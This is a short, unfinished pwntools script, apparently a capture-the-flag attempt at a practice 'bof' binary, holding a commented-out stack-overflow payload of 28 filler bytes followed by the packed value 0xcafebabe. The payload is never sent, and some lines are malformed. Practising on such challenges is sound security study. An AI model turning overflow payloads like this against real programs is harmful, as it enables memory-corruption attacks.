import struct
from pwn import *

run = process('./bof')
# struct.pack('<L', firstfour) * 4 + struct.pack('<L', last)])

print(run.recv('overflow me :'))


#print "A"*28 +struct.pack("<L",0xcafebabe)


'''
>>> 0xcafebabe
3405691582

>>> 

'''